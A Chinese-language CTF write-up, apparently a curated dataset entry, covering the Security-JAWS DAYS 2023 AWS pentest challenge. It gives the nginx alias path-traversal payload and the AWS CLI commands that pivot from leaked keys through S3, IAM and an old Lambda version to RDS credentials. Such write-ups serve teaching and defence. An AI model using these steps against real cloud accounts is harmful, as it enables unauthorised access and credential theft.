---
title: Security-JAWS DAYS CTF Writeups
contest: Security-JAWS DAYS
year: 2023
difficulty: hard
vuln_type: web_unknown
tags: [aws-pentest, s3-bucket, iam-policy, lambda-invoke, nginx-alias-lfi, cloud-ctf]
attack_chain:
- nginx alias /assets 路径穿越 /assets../secret/.htpasswd
- 读 htpasswd → 上传 aws 配置
- aws s3 ls 列出 13 个桶 (backup-37szjp8pny7xx01 等)
- 下载 dboperator_accessKeys.csv 拿到 dboperator 凭据
- aws configure 配置 profile
- aws sts get-caller-identity 确认身份
- aws iam list-attached-user-policies 看 dboperator 策略
- 查策略 v6 版本允许 lambda:InvokeFunction arn:aws:lambda:*:*:function:db-buckup*
- aws lambda get-function --qualifier 1 拿到老版本 location
- 反编译老版本 lambda 代码找 RDS endpoint
- aws rds describe-db-instances 拿数据库凭据
- 最终连接数据库读 flag
key_payload: aws lambda get-function --function-name 'arn:aws:lambda:ap-northeast-1:055450064556:function:db-buckup' --qualifier 1
one_liner: Security-JAWS DAYS 2023 AWS 渗透综合题：nginx alias LFI → S3 桶列 → IAM 越权 → Lambda 老版本下载 → RDS 提权。
lesson: Lambda function 多版本管理是真实风险点；旧版本代码常包含硬编码 endpoint/凭据。
quality: high
---
# Security-JAWS DAYS CTF 2023 – AWS Pentest

## 1. 初始入侵 - nginx alias LFI
```nginx
location /assets {
    alias /usr/share/static/;
}
```
访问 `GET /assets../secret/.htpasswd` → 路径穿越读 nginx 凭据。

## 2. 拿 AWS 凭据
从 htpasswd 提取 `AccessKeyId/SecretAccessKey/Token` 三件套，写入 `~/.aws/credentials`：
```ini
[ctf-hard-aws-pentesting-journey]
aws_access_key_id = [REDACTED]
aws_secret_access_key = [REDACTED]
aws_session_token = [REDACTED]
```

## 3. S3 桶列
`aws s3 ls --profile ctf-hard-aws-pentesting-journey` 列出 13 个桶。逐个 ls 发现：
- `backup-37szjp8pny7xx01/dbbackup/` 含 `dboperator_accessKeys.csv`
- `camouflagedrop-wxhqft4lqf-assets-wxhqft4lqf-assets`
- `s3misssignurl-t6j4qj4r-assets-t6j4qj4r-assets-bucket`

## 4. IAM 越权
拿到 dboperator 凭据后 `aws configure --profile ctf-hard-aws-pentesting-journey-dboperator`。
`iam get-policy --policy-arn arn:aws:iam::055450064556:policy/dboperator` 查 v6 策略：
- `lambda:List*`, `lambda:GetFunction`, `lambda:InvokeFunction` on `db-buckup*`
- `iam:Get*`, `iam:List*` on `policy/dboperator`, `user/dboperator`

## 5. Lambda 老版本
`aws lambda list-versions-by-function --function-name 'db-buckup'` 发现 v1/v2。
`aws lambda get-function --function-name 'arn:...:db-buckup' --qualifier 1` 下载老版本。
反编译看到 RDS endpoint + 凭据。

## 6. RDS 提权
`aws rds describe-db-instances` 拿数据库连接信息，最终连入数据库取 flag。
